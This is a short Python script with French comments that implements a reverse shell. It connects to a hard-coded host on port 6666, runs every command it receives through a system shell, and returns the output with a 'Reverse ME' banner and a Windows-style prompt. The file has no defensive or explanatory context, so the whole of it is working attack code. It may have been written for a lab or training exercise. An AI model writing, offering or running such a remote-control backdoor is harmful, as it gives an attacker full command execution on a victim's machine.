#encoding: utf-8
#coding: utf8
# -*- coding: utf-8 -*-
import time, os, socket, sys, subprocess

#Clear le cmd
os.system('cls')

#IP et Port du serveur
host = str('10.101.200.31')
port = int('6666')

#Ouverture du port et connexion
s = socket.socket()
s.connect((host, port))

#Boucle infinie
while True:
        #Receive data from the socket (1024bits)
        data = s.recv(1024)

        #Execute a child program in a new process
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

        #Récupère sortie standard et la sortie erreure
        res = cmd.stdout.read() + cmd.stderr.read()
        s.send("""
 _______                                                                     __       __  ________ 
/       \                                                                   /  \     /  |/        |
$$$$$$$  |  ______   __     __  ______    ______    _______   ______        $$  \   /$$ |$$$$$$$$/ 
$$ |__$$ | /      \ /  \   /  |/      \  /      \  /       | /      \       $$$  \ /$$$ |$$ |__    
$$    $$< /$$$$$$  |$$  \ /$$//$$$$$$  |/$$$$$$  |/$$$$$$$/ /$$$$$$  |      $$$$  /$$$$ |$$    |   
$$$$$$$  |$$    $$ | $$  /$$/ $$    $$ |$$ |  $$/ $$      \ $$    $$ |      $$ $$ $$/$$ |$$$$$/    
$$ |  $$ |$$$$$$$$/   $$ $$/  $$$$$$$$/ $$ |       $$$$$$  |$$$$$$$$/       $$ |$$$/ $$ |$$ |_____ 
$$ |  $$ |$$       |   $$$/   $$       |$$ |      /     $$/ $$       |      $$ | $/  $$ |$$       |
$$/   $$/  $$$$$$$/     $/     $$$$$$$/ $$/       $$$$$$$/   $$$$$$$/       $$/      $$/ $$$$$$$$/                                                                                               
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
""")
        #Envoie les deux sorties avec le prompt Windows
        s.send(str(res) + str(os.getcwd()) + '> ')



